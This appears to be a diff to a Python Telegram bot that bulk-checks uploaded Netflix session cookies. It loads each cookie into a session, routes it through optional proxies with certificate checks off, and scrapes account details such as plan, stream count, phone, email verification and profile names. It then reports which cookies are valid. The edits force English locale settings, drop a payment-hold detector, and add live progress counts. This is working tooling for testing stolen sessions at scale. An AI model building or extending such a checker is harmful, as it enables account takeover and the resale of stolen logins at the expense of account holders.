@@ -449,6 +449,11 @@ def _check_netflix_cookie(cookie_header: str, timeout_s: int = 10) -> Dict[str, 
 
     session = requests.Session()
     session.cookies.update(cookie_dict)
+    
+    # Enforce English language cookies
+    session.cookies.set("nf_lang", "en", domain=".netflix.com")
+    session.cookies.set("cl_lang", "en-US", domain=".netflix.com")
+    
     if CURRENT_PROXY:
         session.proxies.update(_get_request_proxies())
 
@@ -461,12 +466,13 @@ def _check_netflix_cookie(cookie_header: str, timeout_s: int = 10) -> Dict[str, 
         "Accept": "text/html,application/xhtml+xml",
         "Accept-Language": "en-US,en;q=0.9",
         "Accept-Encoding": "gzip, deflate",
+        "X-Netflix.Context.Locales": "en-US",
     }
 
     urls = [
-        "https://www.netflix.com/YourAccount",
-        "https://www.netflix.com/account",
-        "https://www.netflix.com/account/membership",
+        "https://www.netflix.com/YourAccount?locale=en-US",
+        "https://www.netflix.com/account?locale=en-US",
+        "https://www.netflix.com/account/membership?locale=en-US",
     ]
 
     try:
@@ -475,7 +481,7 @@ def _check_netflix_cookie(cookie_header: str, timeout_s: int = 10) -> Dict[str, 
         for url in urls:
             try:
                 r = session.get(url, headers=headers, timeout=timeout_s, allow_redirects=True, verify=False)
-                if r.status_code == 200 and "Account" in (r.text or ""):
+                if r.status_code == 200 and ("Account" in (r.text or "") or "YourAccount" in r.url):
                     resp = r
                     txt = r.text or ""
                     break
@@ -485,10 +491,6 @@ def _check_netflix_cookie(cookie_header: str, timeout_s: int = 10) -> Dict[str, 
         if not resp or resp.status_code != 200:
             return {"ok": False, "reason": f"HTTP {resp.status_code if resp else 'error'}"}
 
-        # --- ADD THESE 2 DEBUG LINES ---
-        logger.info(f"🔍 DEBUG Page Title: {re.findall(r'<title>(.*?)</title>', txt)}")
-        logger.info(f"🔍 DEBUG HTML Excerpt: {txt[:500]}...")
-        # -------------------------------
         if ("login" in (resp.url or "").lower()) or ("signin" in (resp.url or "").lower()):
             return {"ok": False, "reason": "Redirected to login"}
 
@@ -533,30 +535,6 @@ def _check_netflix_cookie(cookie_header: str, timeout_s: int = 10) -> Dict[str, 
             find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
             or find(r'"maxStreams"\s*:\s*"?([0-9]+)"?')
         )
-        
-        # Comprehensive Hold Detector Targetting UI Messages & Backend JSON Keys
-        hold_patterns = (
-            r"(?i)("
-            r"fix\s+your\s+payment|"
-            r"didn['’]t\s+go\s+through|"
-            r"can['’]t\s+process\s+your\s+payment|"
-            r"retry\s+payment|"
-            r"update\s+payment|"
-            r"membership\s+is?\s*on\s+hold|"
-            r"payment\s+is?\s*on\s+hold|"
-            r"update\s+payment\s+method|"
-            r"update\s+your\s+payment|"
-            r"restart\s+your\s+membership|"
-            r"action\s+required|"
-            r"payment\s+problem|"
-            r'accountstatus["\s:]+hold|'
-            r'accountstatus["\s:]+needs_payment|'
-            r'billingstatus["\s:]+hold|'
-            r'ispaymentproblem["\s:]+true|'
-            r'ishold["\s:]+true'
-            r")"
-        )
-        hold = "Yes" if re.search(hold_patterns, txt) else "No"
 
         extra = "Yes" if re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":true', txt) else "No"
         email_ver = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
@@ -564,7 +542,7 @@ def _check_netflix_cookie(cookie_header: str, timeout_s: int = 10) -> Dict[str, 
 
         profiles: list = []
         try:
-            rp = session.get("https://www.netflix.com/ManageProfiles", timeout=6, verify=False)
+            rp = session.get("https://www.netflix.com/ManageProfiles?locale=en-US", timeout=6, verify=False)
             if rp.status_code == 200:
                 profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text or "")
                 if not profiles:
@@ -593,7 +571,6 @@ def _check_netflix_cookie(cookie_header: str, timeout_s: int = 10) -> Dict[str, 
             "has_phone": "Yes" if phone else "No",
             "video_quality": quality or "HD",
             "max_streams": streams or "2",
-            "on_payment_hold": hold,
             "extra_member": extra,
             "email_verified": email_ver,
             "membership_status": ms,
@@ -799,7 +776,6 @@ async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE)
                 f"• Phone: {acct.get('phone', 'N/A')} ({acct.get('has_phone', 'No')})\n"
                 f"• Quality: {acct.get('video_quality', 'HD')}\n"
                 f"• Streams: {acct.get('max_streams', '2')}\n"
-                f"• Hold Status: {acct.get('on_payment_hold', 'No')}\n"
                 f"• Extra Member: {acct.get('extra_member', 'No')}\n"
                 f"• Extra Member Slot: Unknown\n"
                 f"• Email Verified: {acct.get('email_verified', 'No')}\n"
@@ -891,9 +867,16 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         total_cookies = len(cookie_queue)
         valid_count = 0
         dead_count = 0
+        last_update_time = time.time()
 
         await status_msg.edit_text(
-            f"🔄 Found {total_cookies} cookie(s) to check!\nSend /stop to halt anytime."
+            f"🔄 Starting Bulk Check...\n\n"
+            f"📦 File: `{filename}`\n"
+            f"📊 Total Cookies: {total_cookies}\n"
+            f"⏳ Progress: 0/{total_cookies} (0%)\n"
+            f"🟢 Valid: 0 | 🔴 Dead: 0\n\n"
+            f"Send /stop to halt anytime.",
+            parse_mode="Markdown"
         )
 
         loop = asyncio.get_running_loop()
@@ -904,6 +887,23 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if cancel_bulk_event.is_set():
                 logger.info("Bulk check cancelled by user via /stop")
                 break
+
+            current_time = time.time()
+            if idx % 3 == 0 or (current_time - last_update_time) > 2.0 or idx == total_cookies:
+                percent = int((idx / total_cookies) * 100)
+                try:
+                    await status_msg.edit_text(
+                        f"🔄 Checking Cookies...\n\n"
+                        f"📦 File: `{filename}`\n"
+                        f"📊 Total: {total_cookies}\n"
+                        f"⏳ Progress: {idx}/{total_cookies} ({percent}%)\n"
+                        f"🟢 Valid: {valid_count} | 🔴 Dead: {dead_count}\n\n"
+                        f"Send /stop to halt anytime.",
+                        parse_mode="Markdown"
+                    )
+                    last_update_time = current_time
+                except Exception:
+                    pass
 
             try:
                 cookie_header = _build_cookie_header(cookie_raw)
@@ -942,7 +942,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         f"• Phone: {acct.get('phone', 'N/A')} ({acct.get('has_phone', 'No')})\n"
                         f"• Quality: {acct.get('video_quality', 'HD')}\n"
                         f"• Streams: {acct.get('max_streams', '2')}\n"
-                        f"• Hold Status: {acct.get('on_payment_hold', 'No')}\n"
                         f"• Extra Member: {acct.get('extra_member', 'No')}\n"
                         f"• Extra Member Slot: Unknown\n"
                         f"• Email Verified: {acct.get('email_verified', 'No')}\n"
@@ -973,15 +972,19 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if cancel_bulk_event.is_set():
             await status_msg.edit_text(
-                f"🛑 Bulk Check Stopped Manually!\n\n"
+                f"🛑 **Bulk Check Stopped Manually!**\n\n"
+                f"📊 Final Progress: {idx}/{total_cookies}\n"
                 f"🟢 Valid Found: {valid_count}\n"
-                f"🔴 Dead / Invalid: {dead_count}"
+                f"🔴 Dead / Invalid: {dead_count}",
+                parse_mode="Markdown"
             )
         else:
             await status_msg.edit_text(
-                f"✅ Bulk Check Completed!\n\n"
+                f"✅ **Bulk Check Completed!**\n\n"
+                f"📊 Checked: {total_cookies}/{total_cookies} (100%)\n"
                 f"🟢 Valid Found: {valid_count}\n"
-                f"🔴 Dead / Invalid: {dead_count}"
+                f"🔴 Dead / Invalid: {dead_count}",
+                parse_mode="Markdown"
             )
 
     except Exception as e:
